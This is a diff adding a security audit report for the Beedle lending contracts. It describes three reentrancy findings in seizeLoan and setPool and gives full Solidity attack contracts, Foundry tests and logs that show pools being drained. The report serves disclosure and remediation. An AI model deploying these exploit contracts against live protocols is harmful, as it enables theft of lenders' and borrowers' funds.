@@ -1,0 +1,968 @@
+---
+title: Beedle
+logo: https://res.cloudinary.com/droqoz7lg/image/upload/q_90/dpr_2.0/c_fill,g_auto,h_320,w_320/f_auto/v1/company/is0wiwcjnvzbnesiipsi?_a=BATAUVAA0
+date: "2023-07-24"
+published: true
+HMs: 3
+earnings: 49.54
+authors:
+  - JrNet
+---
+
+
+The code under review can be found in [2023-07-beedle](https://github.com/Cyfrin/2023-07-beedle).
+
+---
+
+# [H-01] Lender of pool cause inconsistency in other pool loans            
+
+### Relevant GitHub Links
+	
+https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L565-L567
+
+### Summary
+In `seize()`, Before deleting loan details `IERC20(loan.collateralToken).transfer(loan.lender, collateral)` is triggered which can lead to exploits if the token is a token that gives control to the sender, like ERC777 tokens. If attacker (loan.lender) later find matching pool and trigger `giveLoan()` as loan details are not deleted and no check is implemented to check if it is set for auction.
+
+### Vulnerability Details
+Loan details are deleted only after transferring the tokens, attacker can call `giveLoan()` with some matching poolld and cause inconsistency in `outstandingLoans` and lock borrowers collateral.
+```solidity
+    function seizeLoan(uint256[] calldata loanIds) public {
+            .
+            .
+            .
+            IERC20(loan.collateralToken).transfer(
+                loan.lender,
+                loan.collateral - govFee
+            );
+            .
+            .
+
+            // update the pool outstanding loans
+            pools[poolId].outstandingLoans -= loan.debt;
+            .
+            .
+            .
+            // delete the loan
+            delete loans[loanId];
+        }
+    }
+```
+
+### Proof of Concept
+
+Test `test_seizeLoan_to_giveLoan` will demonstrate the following flow
+
+1. Attacker creates a pool with `10000 tkn`. 3 Borrowers lended `100 loan tkn` each depositing `100 collateral tkn`.
+2. `loan[0]` is set to acution and it got to seize. Attacker later finds a matching pool.
+3. `seize(loanIds)` is called and `(collateral -fee) tkns` are sent to attacker. Suppose (100 - 5) = 95 collateral tkns transfered to lender.
+4. Attacker calls `giveLoan(uint256[] loanIds, bytes32[] poolIds)`
+5. This updates new and old pools `poolBalance` and `outstandingLoan` 
+6. Debt is deduced twice in oldpool.
+7. Loan gets deleted. New pool shows outstanding debt with no loan in state.
+8. Collateral locked by lender permanently as loan doesn't exist to repay.
+
+
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+import "openzeppelin/token/ERC20/ERC20.sol";
+import "../../src/utils/Structs.sol";
+import {Lender} from "../../src/Lender.sol";
+
+contract TERC20 is ERC20("collateralToken", "ct") {
+
+    function name() public pure override returns (string memory) {
+        return "Test ERC20";
+    }
+
+    function symbol() public pure override returns (string memory) {
+        return "TERC20";
+    }
+
+    function mint(address _to, uint256 _amount) public {
+        _mint(_to, _amount);
+    }
+}
+
+interface IERC20WithCallback {
+    function beforeTokenTransfer (address to, uint256 amount) external;
+}
+
+contract ERC777 is ERC20("loanToken", "lt") {
+
+    function mint(address account, uint256 amount) external returns(bool) {
+        _mint(account, amount);
+        return true;
+    }
+
+    function burnFrom(address account, uint256 amount) external returns(bool) {
+        _burn(account, amount);
+        return true;
+    }
+
+    function transfer(address to, uint256 amount) public virtual override returns (bool)
+    {
+        _beforeTokenTransfer(to, amount);
+        return super.transfer(to, amount);
+    }
+    function isContract(address addr) public view returns(bool) {
+        uint size;
+        assembly { size := extcodesize(addr) }
+        return size > 0;
+    }
+    function _beforeTokenTransfer(address to, uint256 amount) internal {
+        if(isContract(to)) {
+            IERC20WithCallback(to).beforeTokenTransfer(to, amount);
+        }
+    }
+}
+
+contract LenderMock is IERC20WithCallback {
+    Lender public lender;
+
+    event receivedFee(address, uint256);
+    
+    function setLender() public returns(Lender) {
+        return new Lender();
+    }
+
+    function beforeTokenTransfer(address to, uint256 amount) external {
+       emit receivedFee(to, amount);
+    }
+}
+
+contract AttackContract_2 is IERC20WithCallback {
+    uint256[] loanIds;
+    address public lender;
+    address public token;
+    address public collateral; 
+    uint256 amountReceived;
+    bytes32 public poolId;
+    bytes32[] public poolIds;
+    uint256 debt;
+    uint256 cnt;
+
+    function setup(address _lender, address _token, address _collateral, uint256[] calldata _loanIds, bytes32[] calldata _poolIds) public {    
+        loanIds = _loanIds;
+        poolIds = _poolIds;
+        lender = _lender;
+        token = _token;
+        collateral = _collateral;
+        (address pool_lender,,address pool_loanToken, address pool_collateralToken, uint256 _debt,,,,,) = Lender(_lender).loans(_loanIds[0]);
+        debt = _debt;
+        poolId = Lender(lender).getPoolId(pool_lender, pool_loanToken, pool_collateralToken);
+    }
+    
+    function beforeTokenTransfer(address to, uint256 amount) external {
+        Lender(lender).giveLoan(loanIds, poolIds);
+    }
+}
+```
+
+Add this to `tests/SeizeLoanToGiveLoan.t.sol`
+
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+import "forge-std/Test.sol";
+import "./mock/SeizeAttackMock.sol";
+
+contract SeizeLoanToGiveLoan is Test {
+    AttackContract_2 public attack_2_Contract = new AttackContract_2();
+    
+    Lender public lender;
+    TERC20 public loanToken;
+    ERC777 public collateralToken;
+
+    address public attack_2_Address = address(attack_2_Contract);
+    address public lender2 = address(0x2);
+    address public borrower = address(0x5);
+    address public borrower1 = address(0x6);
+    address public borrower2 = address(0x7);
+
+    function setUp() public {
+        LenderMock lenderMock = new LenderMock();
+        lender = lenderMock.setLender();
+        loanToken = new TERC20();
+        collateralToken = new ERC777();
+
+        loanToken.mint(attack_2_Address, 100000*10**18);
+        loanToken.mint(address(lender2), 100000*10**18);
+        //collateralToken.mint(address(lender), 100000*10**18);
+        collateralToken.mint(address(borrower), 100000*10**18);
+        collateralToken.mint(address(borrower1), 100000*10**18);
+        collateralToken.mint(address(borrower2), 100000*10**18);
+        vm.startPrank(attack_2_Address);
+        loanToken.approve(address(lender), 1000000*10**18);
+        collateralToken.approve(address(lender), 1000000*10**18);
+        vm.startPrank(lender2);
+        loanToken.approve(address(lender), 1000000*10**18);
+        collateralToken.approve(address(lender), 1000000*10**18);
+        vm.startPrank(borrower);
+        loanToken.approve(address(lender), 1000000*10**18);
+        collateralToken.approve(address(lender), 1000000*10**18);    
+        vm.startPrank(borrower1);
+        loanToken.approve(address(lender), 1000000*10**18);
+        collateralToken.approve(address(lender), 1000000*10**18);    
+        vm.startPrank(borrower2);
+        loanToken.approve(address(lender), 1000000*10**18);
+        collateralToken.approve(address(lender), 1000000*10**18);    
+    }
+
+    function test_set_and_borrow(address _lender, address _borrower) public returns(bytes32) {
+        // set pool as lender 1
+        
+        bytes32 poolId = test_setPool(_lender);
+
+        test_borrow(poolId, _borrower);
+        return poolId;
+    }
+
+    function test_setPool(address _lender) public returns(bytes32 poolId) {
+        vm.startPrank(_lender);
+        Pool memory p = Pool({
+            lender: _lender,
+            loanToken: address(loanToken),
+            collateralToken: address(collateralToken),
+            minLoanSize: 100*1e18,
+            poolBalance: 10000*1e18,
+            maxLoanRatio: 2*1e18,
+            auctionLength: 1 days,
+            interestRate: 1000,
+            outstandingLoans: 0
+        });
+        return lender.setPool(p);
+    }
+
+    function test_borrow(bytes32 _poolId, address _borrower) public {
+        vm.startPrank(_borrower);
+        Borrow memory b = Borrow({
+            poolId: _poolId,
+            debt: 100*1e18,
+            collateral: 100*1e18
+        });
+        Borrow[] memory borrows = new Borrow[](1);
+        borrows[0] = b;
+        lender.borrow(borrows);
+    }
+
+    function test_seizeLoan_to_giveLoan() public {
+    
+        bytes32 poolId = test_set_and_borrow(attack_2_Address, borrower);
+        
+        test_borrow(poolId, borrower1);     
+        test_borrow(poolId, borrower2);
+        
+        // accrue interest
+        vm.warp(block.timestamp + 364 days + 12 hours);
+        
+        // kick off auction
+        vm.startPrank(attack_2_Address);
+        uint256[] memory loanIds = new uint256[](1);
+        loanIds[0] = 0;
+        lender.startAuction(loanIds);
+
+        vm.warp(block.timestamp + 2 days);
+
+        // setUp another pool
+        bytes32 newPoolId = test_setPool(lender2);
+        bytes32[] memory poolIds = new bytes32[](1);
+        poolIds[0] = keccak256(
+            abi.encode(
+                address(lender2),
+                address(loanToken),
+                address(collateralToken)
+            )
+        );
+
+        attack_2_Contract.setup(address(lender), address(loanToken), address(collateralToken), loanIds, poolIds);
+
+        // Debug -----------------------------------------------------------------
+        (,,,, uint256 _pb2,,,, uint256 _ol2) = lender.pools(poolId);
+        (,,,, uint256 _pb,,,, uint256 _ol) = lender.pools(newPoolId);
+        emit log_string("Before Attack: ");
+        emit log_string("///////////////////////////////////////");
+        emit log_named_decimal_uint("Old Pool Balance: ", _pb2, 18);
+        emit log_named_decimal_uint("New Pool Balance: ", _pb, 18);
+        emit log_named_decimal_uint("Old Pool outstanding debt: ", _ol2, 18);
+        emit log_named_decimal_uint("new Pool outstanding debt: ", _ol, 18);
+        
+        emit log_string("");
+        // -----------------------------------------------------------------------
+  
+        lender.seizeLoan(loanIds);
+        
+         // Debug -----------------------------------------------------------------
+        (,,,, uint256 pb2,,,, uint256 ol2) = lender.pools(poolId);
+        (,,,, uint256 pb,,,, uint256 ol) = lender.pools(newPoolId);
+        emit log_string("Before Attack: ");
+        emit log_string("///////////////////////////////////////");
+        emit log_named_decimal_uint("Old Pool Balance: ", pb2, 18);
+        emit log_named_decimal_uint("New Pool Balance: ", pb, 18);
+        emit log_named_decimal_uint("Old Pool outstanding debt: ", ol2, 18);
+        emit log_named_decimal_uint("new Pool outstanding debt: ", ol, 18);
+        
+        emit log_string("");
+        // -----------------------------------------------------------------------
+    }
+}
+```
+
+Run tests with command `forge test --match-path test/SeizeLoanToGiveLoan.t.sol -vv`
+
+Expected Output:
+
+```solidity
+[PASS] test_seizeLoan_to_giveLoan() (gas: 1527410) // Attack#2
+Logs:
+  Before Attack:
+  ///////////////////////////////////////
+  Old Pool Balance: : 9700.000000000000000000
+  New Pool Balance: : 10000.000000000000000000
+  Old Pool outstanding debt: : 300.000000000000000000
+  new Pool outstanding debt: : 0.000000000000000000
+
+  Before Attack:
+  ///////////////////////////////////////
+  Old Pool Balance: : 9809.036986301369863014
+  New Pool Balance: : 9889.958904109589041096
+  Old Pool outstanding debt: : 100.000000000000000000
+  new Pool outstanding debt: : 110.041095890410958904
+```
+
+
+### Impact
+Loan is deleted after loan transferred to other pool causes inconsistent state in pool data.
+Loan can't be repaid by borrower as funds by borrower are seized by attacker before it is set to auction.
+
+### Tools Used
+Manual code review, Foundry
+
+### Recommendations
+Use reentrancyGaurd or strictly follow Checks Effects Interactions pattern by deleting loan details prior transfer of tokens. 
+
+---
+
+# H-02. Reentrancy bug allows lender to steal other lender funds and make pools inaccessible            
+
+### Relevant GitHub Links
+	
+https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L150-L175C1
+
+### Summary
+A lender can reenter during `setPool` function to steal all loan tokens from the lender contract if other (pool creators) are using loanTokens that can change the control flow. Such tokens are based on ERC20 such as ERC777, ERC223 or other customized ERC20 tokens that alert the receiver of transactions. Example of a real-world popular token that can change control flow is PNT (pNetwork).
+
+### Vulnerability Details
+The reentrancy occurs in the `setPool(Pool calldata p)` function in `Lender.sol` as `pools[poolId]` is updated only after sending tokens to the lender.
+
+```solidity
+    /// @notice set the info for a pool
+    /// updates pool info for msg.sender
+    /// @param p the new pool info
+    function setPool(Pool calldata p) public returns (bytes32 poolId) {
+        // validate the pool - checks
+	      .
+	      .
+	      .
+        uint256 currentBalance = pools[poolId].poolBalance;
+				// interactions
+        if (p.poolBalance > currentBalance) {
+            // if new balance > current balance then transfer the difference from the lender
+            IERC20(p.loanToken).transferFrom(
+                p.lender,
+                address(this),
+                p.poolBalance - currentBalance
+            );
+        } else if (p.poolBalance < currentBalance) {
+            // if new balance < current balance then transfer the difference back to the lender
+            IERC20(p.loanToken).transfer(
+                p.lender,
+                currentBalance - p.poolBalance
+            );
+        }
+	      .
+	      .
+	      .
+
+        pools[poolId] = p; // Effects
+    }
+```
+
+### Proof of Concept
+
+
+The POC will demonstrate the following flow:
+
+Assume the loanToken `tkn`  
+
+1. Assume lender1. lender2 with pools of pool balance 1000 tkn each.
+2. Attacker creates a lending pool with 1000 tkn. Total tkn with lender contract is 3000 tkn
+3. Attacker immediately calls the `setPool` passing Pool `p` as parameter to update pool balance to 0
+4. Contract transfers `currentBalance - p.poolBalance` i.e., 1000 tkn to attacker.
+5. Attacker reenters the `setPool` with `p`. 
+6. As the pool balance is not yet updated to 0,  `uint256 currentBalance = pools[poolId].poolBalance;` returns 1000. and contract transfers another 1000 tokens to  attacker
+7. Attacker reenters until he drains all tkn from contract. He receives 3000 tkn.
+8. Updates the pools[poolId] to 0.
+
+Add the `AttackMock.sol` to mock folder under `/tests/mock`
+
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+import "openzeppelin/token/ERC20/ERC20.sol";
+import "../../src/utils/Structs.sol";
+import {Lender} from "../../src/Lender.sol";
+
+contract TERC20 is ERC20("collateralToken", "ct") {
+
+    function name() public pure override returns (string memory) {
+        return "Test ERC20";
+    }
+
+    function symbol() public pure override returns (string memory) {
+        return "TERC20";
+    }
+
+    function mint(address _to, uint256 _amount) public {
+        _mint(_to, _amount);
+    }
+}
+interface IERC20WithCallback {
+    function beforeTokenTransfer (address to, uint256 amount) external;
+}
+
+contract ERC777 is ERC20("loanToken", "lt") {
+
+    function mint(address account, uint256 amount) external returns(bool) {
+        _mint(account, amount);
+        return true;
+    }
+
+    function burnFrom(address account, uint256 amount) external returns(bool) {
+        _burn(account, amount);
+        return true;
+    }
+
+    function transfer(address to, uint256 amount) public virtual override returns (bool)
+    {
+        _beforeTokenTransfer(to, amount);
+        return super.transfer(to, amount);
+    }
+    function _beforeTokenTransfer(address to, uint256 amount) internal {
+        IERC20WithCallback(to).beforeTokenTransfer(to, amount);
+    }
+}
+
+contract AttackContract is IERC20WithCallback
+{
+    address public lender;
+    address public token;
+    address public collateral; 
+    Pool p;
+    bytes32 public pId;
+    uint256 amountReceived;
+
+    event receivedAmt(address, uint256);
+    event remaining(uint256);
+
+    function setup(address _lender, address _token, address _collateral, Pool calldata _p, bytes32 _poolId) public {
+        lender = _lender;
+        token = _token;
+        collateral = _collateral;
+        p = _p;
+        pId = _poolId;
+    }
+
+    function createPool() public {
+        Lender(lender).setPool(p);
+    }
+
+    function beforeTokenTransfer(address to, uint256 amount) external {
+        // emit receivedAmt(to, amount);
+        amountReceived += amount;
+        uint256 balance = ERC777(token).balanceOf(lender);
+        // emit remaining(balance);
+        if (balance >= amountReceived && balance - amountReceived > 0) {
+            Lender(lender).setPool(p);
+        }
+    }
+}
+```
+
+Add `LenderReentrancy.t.sol` to test folder
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+import "forge-std/Test.sol";
+import "../src/Lender.sol";
+import "../../src/utils/Structs.sol";
+import {AttackContract, TERC20, ERC777} from "./mock/AttackMock.sol";
+
+contract LenderReenterncy is Test {
+    AttackContract attackContract = new AttackContract();
+    address attackAddress= address(attackContract);
+    address attacker = address(0x1);
+
+    Lender public lender;
+    ERC777 public loanToken;
+    TERC20 public collateralToken;
+
+    address public lender1 = address(0x2);
+    address public lender2 = address(0x3);
+
+    bytes32 public pool_1;
+    bytes32 public pool_2;
+    bytes32 public pool_3;
+
+    function setUp() public {
+        lender = new Lender();
+        loanToken = new ERC777();
+        collateralToken = new TERC20();
+
+        // mints
+        loanToken.mint(attackAddress, 100000 * 1e18);
+        loanToken.mint(address(lender1), 100000*10**18);
+        loanToken.mint(address(lender2), 100000*10**18);
+
+        // approvals
+        vm.startPrank(lender1);
+        loanToken.approve(address(lender), 1000000*10**18);
+        collateralToken.approve(address(lender), 1000000*10**18);
+        vm.startPrank(lender2);
+        loanToken.approve(address(lender), 1000000*10**18);
+        collateralToken.approve(address(lender), 1000000*10**18);
+        vm.startPrank(attackAddress);
+        loanToken.approve(address(lender), 1000000*10**18);
+        vm.stopPrank();
+
+        Pool memory p1 = Pool({
+            lender: attackAddress,
+            loanToken: address(loanToken),
+            collateralToken: address(collateralToken),
+            minLoanSize: 100*10**18,
+            poolBalance: 1000*10**18,
+            maxLoanRatio: 2*10**18,
+            auctionLength: 1 days,
+            interestRate: 1000,
+            outstandingLoans: 0
+        });
+
+        // attacker creates pool with 1000 tokens
+        vm.startPrank(attackAddress);
+        pool_1 = lender.setPool(p1);
+        vm.stopPrank();
+
+        Pool memory p2 = Pool({
+            lender: lender1,
+            loanToken: address(loanToken),
+            collateralToken: address(collateralToken),
+            minLoanSize: 100*10**18,
+            poolBalance: 1000*10**18,
+            maxLoanRatio: 2*10**18,
+            auctionLength: 1 days,
+            interestRate: 1000,
+            outstandingLoans: 0
+        });
+
+        // lender 1 creates pool with 1000 tokens
+        vm.startPrank(lender1);
+        pool_2 = lender.setPool(p2);
+        vm.stopPrank();
+        
+        Pool memory p3 = Pool({
+            lender: lender2,
+            loanToken: address(loanToken),
+            collateralToken: address(collateralToken),
+            minLoanSize: 100*10**18,
+            poolBalance: 1000*10**18,
+            maxLoanRatio: 2*10**18,
+            auctionLength: 1 days,
+            interestRate: 1000,
+            outstandingLoans: 0
+        });
+
+        // lender 2 creates pool with 1000 tokens
+        vm.startPrank(lender2);
+        pool_3 = lender.setPool(p3);
+        vm.stopPrank();
+
+        // setup attackerContract
+        Pool memory p4 = Pool({
+            lender: attackAddress,
+            loanToken: address(loanToken),
+            collateralToken: address(collateralToken),
+            minLoanSize: 100*10**18,
+            poolBalance: 0,
+            maxLoanRatio: 2*10**18,
+            auctionLength: 1 days,
+            interestRate: 1000,
+            outstandingLoans: 0
+        });
+
+        attackContract.setup(address(lender), address(loanToken), address(collateralToken), p4, pool_1);
+    }
+
+    function test_reentrancy() public {
+        // debug
+        emit log_string("Before attack");
+        emit log_named_decimal_uint("Contract Balance: ", ERC777(loanToken).balanceOf(address(lender)), 18);
+        (,,,,uint256 poolBalance1,,,,) = lender.pools(pool_1);
+        emit log_named_decimal_uint("Attacker Pool Balance: ", poolBalance1, 18);
+        (,,,,uint256 poolBalance2,,,,) = lender.pools(pool_2);
+        emit log_named_decimal_uint("Pool3 Balance: ", poolBalance2, 18);
+        (,,,,uint256 poolBalance3,,,,) = lender.pools(pool_3);
+        emit log_named_decimal_uint("Pool4 Balance: ", poolBalance3, 18);
+        
+        emit log_named_decimal_uint("Attacker tkn balance: ", loanToken.balanceOf(attackAddress), 18);
+
+        // attack
+        attackContract.createPool();
+        
+       // debug
+        emit log_string("After attack");
+        emit log_named_decimal_uint("Contract Balance: ", ERC777(loanToken).balanceOf(address(lender)), 18);
+        (,,,,uint256 poolBalance4,,,,) = lender.pools(pool_1);
+        emit log_named_decimal_uint("Attacker Pool Balance: ", poolBalance4, 18);
+        (,,,,uint256 poolBalance5,,,,) = lender.pools(pool_2);
+        emit log_named_decimal_uint("Pool2 Balance: ", poolBalance5, 18);
+        (,,,,uint256 poolBalance6,,,,) = lender.pools(pool_3);
+        emit log_named_decimal_uint("Pool3 Balance: ", poolBalance6, 18);
+        emit log_named_decimal_uint("Attacker tkn balance: ", loanToken.balanceOf(attackAddress), 18);
+    }
+}
+```
+
+Run tests `forge test --match-test test_reentrancy -vv`. 
+
+Expected Output
+
+```
+[PASS] test_reentrancy() (gas: 223660)
+Logs:
+  Before attack
+  Contract Balance: : 3000.000000000000000000
+  Attacker Pool Balance: : 1000.000000000000000000
+  Pool2 Balance: : 1000.000000000000000000
+  Pool3 Balance: : 1000.000000000000000000
+  Attacker tkn balance: : 99000.000000000000000000
+  After attack
+  Contract Balance: : 0.000000000000000000
+  Attacker Pool Balance: : 0.000000000000000000
+  Pool2 Pool Balance: : 1000.000000000000000000  // funds not available at contract
+  Pool3 Pool Balance: : 1000.000000000000000000  // funds not available at contract
+  Attacker tkn balance: : 102000.000000000000000000 // gained 3000 tokens instead of 1000
+```
+
+### Impact
+Loss of funds and made other pools inaccessible.
+
+### Tools Used
+Foundry
+
+### Recommendations
+Send tokens only at the end of `setPool(Pool p)` or add a reentrancyGuard.
+
+---
+
+# M-01. Reentrancy in `seizeLoan` allows lender can transfer all his loan's collateral tokens before `loan.auctionLength` passes.  
+
+### Relevant GitHub Links
+	
+https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L565-L568
+
+https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L381-L401
+
+### Summary
+In `seizeLoan(uint256[] calldata loanId)` loan details are deleted after transferring tokens to the lender. If the `pool` tokens can change the control flow (tokens on ERC20 such as ERC777, ERC223 or other customized ERC20 tokens that alert the receiver of transactions) then
+1. Allows lender to transfer all his loans collateral before `loan.auctionLength` passed.
+
+### Vulnerability Details
+When a loan is seized by calling `seizeLoan(uint256[] calldata loanId)` the control is transfered to the lender before deleting loan details. So that lender can reenter the same function if tokens are based on ERC20 such as ERC777, ERC223 or other customized ERC20.
+
+```solidity
+IERC20(loan.collateralToken).transfer(
+    loan.lender,
+    loan.collateral - govFee
+)//@audit-info reentrancy 
+.
+.
+.
+delete loans[loanId];
+```
+
+Test `test_seizeLoan_reentrancy` will demonstrate the following flow
+
+1. Attacker creates a pool with `10000 tkn`. 3 Borrowers lended `100 loan tkn` each depositing `100 collateral tkn`.
+2. `loan[0]` is set to acution and it got to seize. 
+3. `seize(loanIds)` is called and `(collateral -fee) tkns` are sent to attacker. Suppose (100 - 5) = 95 collateral tkns transfered to lender.
+4. Attacker reenters seize with same loanIds `loan[0]`(this loan details exist as it is not yet deleted). until `outstandingLoan` is made 0
+5. Attacker gains 95 * 3 = `285 collateral tokens`. Where he supposed to get `95 collateral tkns`. When borrower try to pay loan this may lock their collateral if `outstandingLoan` remains zero.
+
+
+Add this to `tests/mock/SeizeAttackMock.sol`
+
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+import "openzeppelin/token/ERC20/ERC20.sol";
+import "../../src/utils/Structs.sol";
+import {Lender} from "../../src/Lender.sol";
+
+contract TERC20 is ERC20("collateralToken", "ct") {
+
+    function name() public pure override returns (string memory) {
+        return "Test ERC20";
+    }
+
+    function symbol() public pure override returns (string memory) {
+        return "TERC20";
+    }
+
+    function mint(address _to, uint256 _amount) public {
+        _mint(_to, _amount);
+    }
+}
+interface IERC20WithCallback {
+    function beforeTokenTransfer (address to, uint256 amount) external;
+}
+
+contract ERC777 is ERC20("loanToken", "lt") {
+
+    function mint(address account, uint256 amount) external returns(bool) {
+        _mint(account, amount);
+        return true;
+    }
+
+    function burnFrom(address account, uint256 amount) external returns(bool) {
+        _burn(account, amount);
+        return true;
+    }
+
+    function transfer(address to, uint256 amount) public virtual override returns (bool)
+    {
+        _beforeTokenTransfer(to, amount);
+        return super.transfer(to, amount);
+    }
+    function isContract(address addr) public view returns(bool) {
+        uint size;
+        assembly { size := extcodesize(addr) }
+        return size > 0;
+    }
+    function _beforeTokenTransfer(address to, uint256 amount) internal {
+        if(isContract(to)) {
+            IERC20WithCallback(to).beforeTokenTransfer(to, amount);
+        }
+    }
+}
+
+contract LenderMock is IERC20WithCallback {
+    Lender public lender;
+
+    event receivedFee(address, uint256);
+    
+    function setLender() public returns(Lender) {
+        return new Lender();
+    }
+
+    function beforeTokenTransfer(address to, uint256 amount) external {
+       emit receivedFee(to, amount);
+    }
+}
+
+contract AttackContract_1 is IERC20WithCallback {
+    uint256[] loanIds;
+    address public lender;
+    address public token;
+    address public collateral; 
+    uint256 amountReceived;
+    bytes32 poolId;
+    uint256 debt;
+    uint256 cnt;
+
+    function setup(address _lender, address _token, address _collateral, uint256[] calldata _loanIds) public {    
+        loanIds = _loanIds;
+        lender = _lender;
+        token = _token;
+        collateral = _collateral;
+        (address pool_lender,,address pool_loanToken, address pool_collateralToken, uint256 _debt,,,,,) = Lender(_lender).loans(_loanIds[0]);
+        debt = _debt;
+        poolId = Lender(lender).getPoolId(pool_lender, pool_loanToken, pool_collateralToken);
+    }
+    
+    function beforeTokenTransfer(address to, uint256 amount) external {
+        // cnt += 1;
+        amountReceived += amount;
+        uint256 balance = ERC777(collateral).balanceOf(lender);
+        (,,,,,,,,uint256 outstandingLoans) = Lender(lender).pools(poolId);
+
+        if (balance > amountReceived &&  outstandingLoans > debt) {
+            Lender(lender).seizeLoan(loanIds);
+        }
+    }
+}
+```
+
+Add this to `tests/SeizeLoanReentrancy.t.sol`
+
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+import "forge-std/Test.sol";
+import "./mock/SeizeAttackMock.sol";
+
+contract SeizeReentrancy is Test {
+    AttackContract_1 public attack_1_Contract = new AttackContract_1();
+    
+    Lender public lender;
+    TERC20 public loanToken;
+    ERC777 public collateralToken;
+
+    address public attack_1_Address = address(attack_1_Contract);
+    address public lender2 = address(0x2);
+    address public borrower = address(0x5);
+    address public borrower1 = address(0x6);
+    address public borrower2 = address(0x7);
+
+    function setUp() public {
+        LenderMock lenderMock = new LenderMock();
+        lender = lenderMock.setLender();
+        loanToken = new TERC20();
+        collateralToken = new ERC777();
+
+        loanToken.mint(attack_1_Address, 100000*10**18);
+        loanToken.mint(address(lender2), 100000*10**18);
+        //collateralToken.mint(address(lender), 100000*10**18);
+        collateralToken.mint(address(borrower), 100000*10**18);
+        collateralToken.mint(address(borrower1), 100000*10**18);
+        collateralToken.mint(address(borrower2), 100000*10**18);
+        vm.startPrank(attack_1_Address);
+        loanToken.approve(address(lender), 1000000*10**18);
+        collateralToken.approve(address(lender), 1000000*10**18);
+        vm.startPrank(lender2);
+        loanToken.approve(address(lender), 1000000*10**18);
+        collateralToken.approve(address(lender), 1000000*10**18);
+        vm.startPrank(borrower);
+        loanToken.approve(address(lender), 1000000*10**18);
+        collateralToken.approve(address(lender), 1000000*10**18);    
+        vm.startPrank(borrower1);
+        loanToken.approve(address(lender), 1000000*10**18);
+        collateralToken.approve(address(lender), 1000000*10**18);    
+        vm.startPrank(borrower2);
+        loanToken.approve(address(lender), 1000000*10**18);
+        collateralToken.approve(address(lender), 1000000*10**18);    
+    }
+
+    function test_set_and_borrow(address _lender, address _borrower) public returns(bytes32) {
+        // set pool as lender 1
+        
+        bytes32 poolId = test_setPool(_lender);
+
+        test_borrow(poolId, _borrower);
+        return poolId;
+    }
+
+    function test_setPool(address _lender) public returns(bytes32 poolId) {
+        vm.startPrank(_lender);
+        Pool memory p = Pool({
+            lender: _lender,
+            loanToken: address(loanToken),
+            collateralToken: address(collateralToken),
+            minLoanSize: 100*1e18,
+            poolBalance: 10000*1e18,
+            maxLoanRatio: 2*1e18,
+            auctionLength: 1 days,
+            interestRate: 1000,
+            outstandingLoans: 0
+        });
+        return lender.setPool(p);
+    }
+
+    function test_borrow(bytes32 _poolId, address _borrower) public {
+        vm.startPrank(_borrower);
+        Borrow memory b = Borrow({
+            poolId: _poolId,
+            debt: 100*1e18,
+            collateral: 100*1e18
+        });
+        Borrow[] memory borrows = new Borrow[](1);
+        borrows[0] = b;
+        lender.borrow(borrows);
+    }
+
+    function test_seizeLoan_reentrancy() public {
+        bytes32 poolId = test_set_and_borrow(attack_1_Address, borrower);
+        
+        test_borrow(poolId, borrower1);     
+        test_borrow(poolId, borrower2);
+        
+        // accrue interest
+        vm.warp(block.timestamp + 364 days + 12 hours);
+        
+        // kick off auction
+        vm.startPrank(attack_1_Address);
+        uint256[] memory loanIds = new uint256[](1);
+        loanIds[0] = 0;
+        lender.startAuction(loanIds);
+
+        vm.warp(block.timestamp + 2 days);
+        attack_1_Contract.setup(address(lender), address(loanToken), address(collateralToken), loanIds);
+
+        // Debug -----------------------------------------------------------------
+        (,,,, uint256 _pb2,,,, uint256 _ol2) = lender.pools(poolId);
+        emit log_string("Before Attack: ");
+        emit log_string("///////////////////////////////////////");
+        emit log_named_decimal_uint("Lender Contract Collateral Tokens: ", collateralToken.balanceOf(address(lender)), 18);
+        emit log_named_decimal_uint("Attacker Collateral Tokens: ", collateralToken.balanceOf(attack_1_Address), 18);
+        emit log_named_decimal_uint("Attacker Pool Outstanding Loans: ", _ol2, 18);
+        
+        emit log_string("");
+        // -----------------------------------------------------------------------
+  
+        lender.seizeLoan(loanIds);
+        
+        // Debug -----------------------------------------------------------------
+        (,,,, uint256 _pb,,,, uint256 _ol) = lender.pools(poolId);
+        emit log_string("After Attack: ");
+        emit log_string("///////////////////////////////////////");
+        emit log_named_decimal_uint("Lender Contract Collateral Tokens: ", collateralToken.balanceOf(address(lender)), 18);
+        emit log_named_decimal_uint("Attacker Collateral Tokens: ", collateralToken.balanceOf(attack_1_Address), 18);
+        emit log_named_decimal_uint("Attacker Pool Outstanding Loans: ", _ol, 18);
+        emit log_string("");
+        // -----------------------------------------------------------------------
+    }
+```
+
+Run tests with command `forge test --match-path test/SeizeReentrancy.t.sol -vv`
+
+Expected Output:
+
+```solidity
+[PASS] test_seizeLoan_reentrancy() (gas: 1257290) // Attack#1
+Logs:
+  Before Attack:
+  ///////////////////////////////////////
+  Lender Contract Collateral Tokens: : 300.000000000000000000
+  Attacker Collateral Tokens: : 0.000000000000000000
+  Attacker Pool Outstanding Loans: : 300.000000000000000000
+
+  After Attack:
+  ///////////////////////////////////////
+  Lender Contract Collateral Tokens: : 0.000000000000000000
+  Attacker Collateral Tokens: : 298.500000000000000000
+  Attacker Pool Outstanding Loans: : 0.000000000000000000
+```
+
+### Impact
+Lenders can withdraw collateral tokens even the loan auction length remains. Thus borrower collateral locked by lender.
+
+### Tools Used
+Foundry
+
+### Recommendations
+Delete loan details before transferring handle to lender.
